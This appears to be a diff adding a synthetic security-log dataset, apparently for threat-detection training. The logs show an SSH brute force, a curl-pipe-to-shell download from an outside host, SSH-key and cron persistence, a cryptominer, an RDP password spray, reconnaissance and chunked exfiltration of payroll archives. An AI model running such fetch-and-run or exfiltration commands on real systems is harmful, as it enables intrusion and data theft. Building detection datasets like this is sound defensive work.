@@ -1,0 +1,501 @@
+﻿Log_ID,Timestamp,Hostname,Event_ID,User,Source_IP,Destination,Log_Source,Event_Description,Process_CommandLine,Result,Severity
+EVT-00001,2026-11-02 08:00:27,WS-103,4688,CORP\jrivas,10.20.5.103,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00002,2026-11-02 08:02:46,DB-SRV02,4624,CORP\rvega,10.20.3.107,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00003,2026-11-02 08:08:09,WS-112,4688,CORP\bacosta,10.20.5.112,,Security,A new process has been created,onedrive.exe,Success,Informational
+EVT-00004,2026-11-02 08:08:51,DB-SRV02,4624,CORP\tparedes,10.20.5.109,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00005,2026-11-02 08:09:33,APP-SRV02,4624,CORP\jrivas,10.20.5.103,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00006,2026-11-02 08:09:41,FS-SRV01,4624,CORP\tparedes,10.20.5.109,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00007,2026-11-02 08:15:42,DB-SRV02,4634,CORP\lcastro,10.20.3.101,,Security,An account was logged off,,Success,Informational
+EVT-00008,2026-11-02 08:18:14,FS-SRV01,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00009,2026-11-02 08:20:12,DC-01,7036,SYSTEM,10.20.2.40,,System,Service entered running state,,Success,Informational
+EVT-00010,2026-11-02 08:21:06,WS-109,PROXY_ACCESS,CORP\mflores,10.20.4.109,192.0.2.50:443,Proxy,HTTPS GET outbound,bytes_out=6972 uri=/3rw1li,Allowed,Informational
+EVT-00011,2026-11-02 08:21:48,WS-105,4688,CORP\dsosa,10.20.4.105,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00012,2026-11-02 08:22:33,FS-SRV01,5140,CORP\lcastro,10.20.3.101,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00013,2026-11-02 08:23:58,WS-109,PROXY_ACCESS,CORP\mflores,10.20.4.109,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=7198 uri=/uyoly0,Allowed,Informational
+EVT-00014,2026-11-02 08:24:04,APP-SRV02,4634,CORP\fsuarez,10.20.4.111,,Security,An account was logged off,,Success,Informational
+EVT-00015,2026-11-02 08:24:47,FS-SRV01,5140,CORP\jrivas,10.20.5.103,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00016,2026-11-02 08:25:53,APP-SRV02,7036,SYSTEM,10.20.1.50,,System,Service entered running state,,Success,Informational
+EVT-00017,2026-11-02 08:26:44,DC-01,4625,CORP\fsuarez,10.20.4.111,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00018,2026-11-02 08:28:07,FS-SRV01,5140,CORP\rvega,10.20.3.107,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00019,2026-11-02 08:36:52,DB-SRV02,4624,CORP\lcastro,10.20.3.101,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00020,2026-11-02 08:37:25,APP-SRV02,4624,CORP\mflores,10.20.4.109,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00021,2026-11-02 08:40:40,WEB-02,HTTP_ACCESS,-,10.20.4.108,WEB-02:443,IIS,HTTP request,/,200,Informational
+EVT-00022,2026-11-02 08:43:00,DC-01,4624,CORP\bacosta,10.20.5.112,DB-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00023,2026-11-02 08:44:28,WS-101,PROXY_ACCESS,CORP\lcastro,10.20.3.101,192.0.2.50:443,Proxy,HTTPS GET outbound,bytes_out=2007 uri=/sg1vk3,Allowed,Informational
+EVT-00024,2026-11-02 08:45:00,FS-SRV01,4688,CORP\backupsvc,10.20.1.20,,Security,A new process has been created,vssadmin.exe list shadows,Success,Informational
+EVT-00025,2026-11-02 08:45:46,FS-SRV01,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00026,2026-11-02 08:47:26,MAIL-GW01,EMAIL_DELIVERED,bacosta@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment agenda.docx,,Success,Informational
+EVT-00027,2026-11-02 08:48:35,DB-SRV02,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00028,2026-11-02 08:49:09,FS-SRV01,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00029,2026-11-02 08:51:03,DC-01,4625,CORP\jrivas,10.20.5.103,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00030,2026-11-02 08:51:16,WS-110,dns_query,nibarra,10.20.3.110,10.20.1.10,DNS,A query www.zoom.us,,Success,Informational
+EVT-00031,2026-11-02 08:52:54,WS-112,4688,CORP\bacosta,10.20.5.112,,Security,A new process has been created,winword.exe,Success,Informational
+EVT-00032,2026-11-02 08:54:07,WS-112,PROXY_ACCESS,CORP\bacosta,10.20.5.112,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=5864 uri=/9q5yio,Allowed,Informational
+EVT-00033,2026-11-02 08:55:43,FS-SRV01,4624,CORP\tparedes,10.20.5.109,APP-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00034,2026-11-02 09:02:58,WEB-02,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00035,2026-11-02 09:03:03,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00036,2026-11-02 09:03:47,APP-SRV02,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00037,2026-11-02 09:05:45,APP-SRV02,4624,CORP\pmendez,10.20.3.104,DB-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00038,2026-11-02 09:05:57,DC-01,4624,CORP\jrivas,10.20.5.103,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00039,2026-11-02 09:07:12,WS-109,4688,CORP\tparedes,10.20.5.109,,Security,A new process has been created,onedrive.exe,Success,Informational
+EVT-00040,2026-11-02 09:08:05,MAIL-GW01,EMAIL_DELIVERED,fsuarez@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment agenda.docx,,Success,Informational
+EVT-00041,2026-11-02 09:09:16,DC-01,4625,CORP\tparedes,10.20.5.109,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00042,2026-11-02 09:12:08,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00043,2026-11-02 09:12:17,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00044,2026-11-02 09:12:24,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00045,2026-11-02 09:12:36,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00046,2026-11-02 09:12:44,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00047,2026-11-02 09:12:50,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00048,2026-11-02 09:12:59,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00049,2026-11-02 09:13:11,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00050,2026-11-02 09:13:22,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00051,2026-11-02 09:13:29,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00052,2026-11-02 09:13:40,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00053,2026-11-02 09:13:50,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00054,2026-11-02 09:13:58,LNX-APP01,ssh_login,admin,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00055,2026-11-02 09:14:09,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Failed password for invalid credentials,,failed,Informational
+EVT-00056,2026-11-02 09:14:29,LNX-APP01,ssh_login,root,198.51.100.200,10.20.5.15,Auth,Accepted password for root,,success,Informational
+EVT-00057,2026-11-02 09:14:44,LNX-APP01,spawn_shell,root,10.20.5.15,10.20.5.15,Process,Interactive shell /bin/bash spawned by sshd,/bin/bash -i,Success,Informational
+EVT-00058,2026-11-02 09:15:24,LNX-APP01,process_exec,root,10.20.5.15,10.20.5.15,Process,Process executed: curl -s http://203.0.113.200/x.sh | sh,curl -s http://203.0.113.200/x.sh | sh,Success,Warning
+EVT-00059,2026-11-02 09:15:54,LNX-APP01,file_write,root,10.20.5.15,10.20.5.15,Process,Modified /root/.ssh/authorized_keys (new key appended),,Success,Warning
+EVT-00060,2026-11-02 09:16:14,LNX-APP01,cron_edit,root,10.20.5.15,10.20.5.15,Process,crontab modified: */5 * * * * /tmp/.x/update.sh,,Success,Warning
+EVT-00061,2026-11-02 09:16:47,APP-SRV02,4634,CORP\cmolina,10.20.4.108,,Security,An account was logged off,,Success,Informational
+EVT-00062,2026-11-02 09:18:23,LNX-APP01,cpu_alert,SYSTEM,10.20.5.15,,Monitoring,CPU utilization at 97% for 5 minutes,,Success,Warning
+EVT-00063,2026-11-02 09:19:39,WS-108,dns_query,cmolina,10.20.4.108,10.20.1.10,DNS,A query www.zoom.us,,Success,Informational
+EVT-00064,2026-11-02 09:20:32,LNX-APP01,cpu_alert,SYSTEM,10.20.5.15,,Monitoring,CPU utilization at 97% for 5 minutes,,Success,Warning
+EVT-00065,2026-11-02 09:22:52,LNX-APP01,cpu_alert,SYSTEM,10.20.5.15,,Monitoring,CPU utilization at 99% for 5 minutes,,Success,Warning
+EVT-00066,2026-11-02 09:23:22,LNX-APP01,process_exec,root,10.20.5.15,10.20.5.15,Process,Process executed: /tmp/.x/xmrig --donate-level 1,/tmp/.x/xmrig --donate-level 1,Success,High
+EVT-00067,2026-11-02 09:23:32,LNX-APP01,net_connect,root,10.20.5.15,203.0.113.99:3333,Network,Outbound connection to mining pool (stratum+tcp) 203.0.113.99:3333,,Success,High
+EVT-00068,2026-11-02 09:24:10,MAIL-GW01,EMAIL_DELIVERED,mflores@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment agenda.docx,,Success,Informational
+EVT-00069,2026-11-02 09:25:05,WS-111,PROXY_ACCESS,CORP\fsuarez,10.20.4.111,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=5747 uri=/ko80pc,Allowed,Informational
+EVT-00070,2026-11-02 09:26:04,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,winword.exe,Success,Informational
+EVT-00071,2026-11-02 09:30:16,WS-111,4688,CORP\fsuarez,10.20.4.111,,Security,A new process has been created,excel.exe,Success,Informational
+EVT-00072,2026-11-02 09:30:31,DC-01,4624,CORP\nibarra,10.20.3.110,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00073,2026-11-02 09:32:06,DC-01,4634,CORP\lcastro,10.20.3.101,,Security,An account was logged off,,Success,Informational
+EVT-00074,2026-11-02 09:33:08,APP-SRV02,4634,CORP\rvega,10.20.3.107,,Security,An account was logged off,,Success,Informational
+EVT-00075,2026-11-02 09:33:57,WEB-02,7036,SYSTEM,10.20.1.50,,System,Service entered running state,,Success,Informational
+EVT-00076,2026-11-02 09:34:51,FS-SRV01,4624,CORP\bacosta,10.20.5.112,DC-01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00077,2026-11-02 09:36:03,DB-SRV02,7036,SYSTEM,10.20.1.20,,System,Service entered running state,,Success,Informational
+EVT-00078,2026-11-02 09:40:27,WS-110,dns_query,nibarra,10.20.3.110,10.20.1.10,DNS,A query www.zoom.us,,Success,Informational
+EVT-00079,2026-11-02 09:41:31,FS-SRV01,4624,CORP\cmolina,10.20.4.108,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00080,2026-11-02 09:43:45,FS-SRV01,5140,CORP\agomez,10.20.5.106,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00081,2026-11-02 09:47:38,FS-SRV01,4634,CORP\rvega,10.20.3.107,,Security,An account was logged off,,Success,Informational
+EVT-00082,2026-11-02 09:47:49,WEB-02,HTTP_ACCESS,-,10.20.4.109,WEB-02:443,IIS,HTTP request,/api/products,200,Informational
+EVT-00083,2026-11-02 09:49:15,APP-SRV02,4624,CORP\jrivas,10.20.5.103,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00084,2026-11-02 09:50:24,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_00.xlsx,Success,Informational
+EVT-00085,2026-11-02 09:51:01,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_01.xlsx,Success,Informational
+EVT-00086,2026-11-02 09:51:30,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_02.xlsx,Success,Informational
+EVT-00087,2026-11-02 09:52:07,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_03.xlsx,Success,Informational
+EVT-00088,2026-11-02 09:52:29,FS-SRV01,5140,CORP\jrivas,10.20.5.103,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00089,2026-11-02 09:52:32,DC-01,4625,CORP\lcastro,10.20.3.101,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00090,2026-11-02 09:52:38,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_04.xlsx,Success,Informational
+EVT-00091,2026-11-02 09:53:04,FS-SRV01,4663,CORP\cmolina,10.20.4.108,\\FS-SRV01\Finance,Security,An attempt was made to access an object,File access: Finance\Reportes\cierre_05.xlsx,Success,Informational
+EVT-00092,2026-11-02 09:59:46,FS-SRV01,4624,CORP\agomez,10.20.5.106,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00093,2026-11-02 10:00:26,WS-109,PROXY_ACCESS,CORP\mflores,10.20.4.109,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=2936 uri=/9ekazx,Allowed,Informational
+EVT-00094,2026-11-02 10:01:36,DC-01,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00095,2026-11-02 10:02:38,FS-SRV01,4624,CORP\jrivas,10.20.5.103,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00096,2026-11-02 10:04:10,DC-01,4625,CORP\mflores,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00097,2026-11-02 10:04:25,DC-01,4625,CORP\mflores,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00098,2026-11-02 10:04:36,DC-01,4625,CORP\jrivas,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00099,2026-11-02 10:04:46,DC-01,4625,CORP\jrivas,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00100,2026-11-02 10:05:01,DC-01,4625,CORP\pmendez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00101,2026-11-02 10:05:10,DC-01,4625,CORP\pmendez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00102,2026-11-02 10:05:22,DC-01,4625,CORP\dsosa,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00103,2026-11-02 10:05:37,DC-01,4625,CORP\dsosa,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00104,2026-11-02 10:05:53,DC-01,4625,CORP\agomez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00105,2026-11-02 10:06:05,DC-01,4625,CORP\agomez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00106,2026-11-02 10:06:16,DC-01,4625,CORP\rvega,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00107,2026-11-02 10:06:31,DC-01,4625,CORP\rvega,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00108,2026-11-02 10:06:47,DC-01,4625,CORP\cmolina,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00109,2026-11-02 10:07:01,DC-01,4625,CORP\cmolina,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00110,2026-11-02 10:07:13,DC-01,4625,CORP\tparedes,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00111,2026-11-02 10:07:22,DC-01,4625,CORP\tparedes,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00112,2026-11-02 10:07:32,DC-01,4625,CORP\nibarra,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00113,2026-11-02 10:07:42,DC-01,4625,CORP\nibarra,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00114,2026-11-02 10:07:52,DC-01,4625,CORP\fsuarez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00115,2026-11-02 10:08:01,DC-01,4625,CORP\fsuarez,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00116,2026-11-02 10:08:10,DC-01,4625,CORP\bacosta,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00117,2026-11-02 10:08:24,WEB-02,4624,CORP\agomez,10.20.5.106,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00118,2026-11-02 10:08:26,DC-01,4625,CORP\bacosta,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00119,2026-11-02 10:08:30,FS-SRV01,4634,CORP\rvega,10.20.3.107,,Security,An account was logged off,,Success,Informational
+EVT-00120,2026-11-02 10:08:40,DC-01,4625,CORP\lcastro,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00121,2026-11-02 10:08:50,DC-01,4625,CORP\lcastro,203.0.113.60,APP-SRV02,Security,An account failed to log on (LogonType=10; RDP),,Failure,Informational
+EVT-00122,2026-11-02 10:09:30,APP-SRV02,4624,CORP\lcastro,203.0.113.60,APP-SRV02,Security,An account was successfully logged on (LogonType=10; RDP),,Success,Medium
+EVT-00123,2026-11-02 10:09:38,APP-SRV02,4672,CORP\lcastro,203.0.113.60,APP-SRV02,Security,Special privileges assigned to new logon,,Success,Informational
+EVT-00124,2026-11-02 10:10:56,WS-112,4688,CORP\bacosta,10.20.5.112,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00125,2026-11-02 10:12:38,APP-SRV02,4104,CORP\lcastro,203.0.113.60,,PowerShell,PowerShell Script Block: Get-ADGroupMember 'Domain Admins'; Get-SmbShare,powershell.exe,Success,High
+EVT-00126,2026-11-02 10:13:28,APP-SRV02,4688,CORP\lcastro,203.0.113.60,,Security,A new process has been created,powershell.exe -NoProfile -EncodedCommand [REDACTED_SYNTHETIC],Success,High
+EVT-00127,2026-11-02 10:14:38,APP-SRV02,4688,CORP\lcastro,203.0.113.60,,Security,A new process has been created,whoami.exe /all,Success,Informational
+EVT-00128,2026-11-02 10:15:23,APP-SRV02,4688,CORP\lcastro,203.0.113.60,,Security,A new process has been created,"net.exe group ""Domain Admins"" /domain",Success,Medium
+EVT-00129,2026-11-02 10:15:29,WS-106,4688,CORP\agomez,10.20.5.106,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00130,2026-11-02 10:16:23,APP-SRV02,4688,CORP\lcastro,203.0.113.60,,Security,A new process has been created,net.exe view \\FS-SRV01,Success,Medium
+EVT-00131,2026-11-02 10:17:16,WS-108,4688,CORP\cmolina,10.20.4.108,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00132,2026-11-02 10:17:44,WS-110,4688,CORP\nibarra,10.20.3.110,,Security,A new process has been created,chrome.exe,Success,Informational
+EVT-00133,2026-11-02 10:20:05,WEB-02,4634,CORP\cmolina,10.20.4.108,,Security,An account was logged off,,Success,Informational
+EVT-00134,2026-11-02 10:20:23,FS-SRV01,4624,CORP\lcastro,10.20.1.30,FS-SRV01,Security,An account was successfully logged on (LogonType=3; source=APP-SRV02),,Success,High
+EVT-00135,2026-11-02 10:21:08,FS-SRV01,5140,CORP\lcastro,10.20.1.30,FS-SRV01,Security,Network share accessed: \\FS-SRV01\HR,,Success,High
+EVT-00136,2026-11-02 10:21:55,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_000.xlsx,Success,Warning
+EVT-00137,2026-11-02 10:22:07,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_001.xlsx,Success,Warning
+EVT-00138,2026-11-02 10:22:12,WEB-02,4624,CORP\pmendez,10.20.3.104,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00139,2026-11-02 10:22:21,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_002.xlsx,Success,Warning
+EVT-00140,2026-11-02 10:22:28,DC-01,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00141,2026-11-02 10:22:40,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_003.xlsx,Success,Warning
+EVT-00142,2026-11-02 10:22:52,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_004.xlsx,Success,Warning
+EVT-00143,2026-11-02 10:23:07,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_005.xlsx,Success,Warning
+EVT-00144,2026-11-02 10:23:08,WEB-02,HTTP_ACCESS,-,10.20.4.109,WEB-02:443,IIS,HTTP request,/,200,Informational
+EVT-00145,2026-11-02 10:23:26,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_006.xlsx,Success,Warning
+EVT-00146,2026-11-02 10:23:45,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_007.xlsx,Success,Warning
+EVT-00147,2026-11-02 10:24:02,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_008.xlsx,Success,Warning
+EVT-00148,2026-11-02 10:24:03,FS-SRV01,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00149,2026-11-02 10:24:14,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_009.xlsx,Success,Warning
+EVT-00150,2026-11-02 10:24:29,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_010.xlsx,Success,Warning
+EVT-00151,2026-11-02 10:24:42,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_011.xlsx,Success,Warning
+EVT-00152,2026-11-02 10:24:57,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_012.xlsx,Success,Warning
+EVT-00153,2026-11-02 10:25:13,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_013.xlsx,Success,Warning
+EVT-00154,2026-11-02 10:25:25,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_014.xlsx,Success,Warning
+EVT-00155,2026-11-02 10:25:43,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_015.xlsx,Success,Warning
+EVT-00156,2026-11-02 10:25:54,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_016.xlsx,Success,Warning
+EVT-00157,2026-11-02 10:26:12,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_017.xlsx,Success,Warning
+EVT-00158,2026-11-02 10:26:25,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_018.xlsx,Success,Warning
+EVT-00159,2026-11-02 10:26:41,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_019.xlsx,Success,Warning
+EVT-00160,2026-11-02 10:26:57,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_020.xlsx,Success,Warning
+EVT-00161,2026-11-02 10:27:16,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_021.xlsx,Success,Warning
+EVT-00162,2026-11-02 10:27:33,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_022.xlsx,Success,Warning
+EVT-00163,2026-11-02 10:27:46,FS-SRV01,4663,CORP\lcastro,10.20.1.30,\\FS-SRV01\HR,Security,An attempt was made to access an object,File access: HR\Payroll2026\document_023.xlsx,Success,Warning
+EVT-00164,2026-11-02 10:28:24,FS-SRV01,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00165,2026-11-02 10:28:26,FS-SRV01,4688,CORP\lcastro,10.20.1.30,,Security,A new process has been created,7z.exe a C:\Windows\Temp\hr_payroll.7z \\FS-SRV01\HR\Payroll2026\*.xlsx,Success,Informational
+EVT-00166,2026-11-02 10:29:11,MAIL-GW01,EMAIL_DELIVERED,cmolina@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment presupuesto.xlsx,,Success,Informational
+EVT-00167,2026-11-02 10:30:46,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=26732862 uri=/upload/chunk/1,Allowed,Warning
+EVT-00168,2026-11-02 10:31:04,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=29706785 uri=/upload/chunk/2,Allowed,Warning
+EVT-00169,2026-11-02 10:31:24,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=28288201 uri=/upload/chunk/3,Allowed,Warning
+EVT-00170,2026-11-02 10:31:43,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=26029787 uri=/upload/chunk/4,Allowed,Warning
+EVT-00171,2026-11-02 10:32:02,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=28522051 uri=/upload/chunk/5,Allowed,Warning
+EVT-00172,2026-11-02 10:32:16,FS-SRV01,4634,CORP\fsuarez,10.20.4.111,,Security,An account was logged off,,Success,Informational
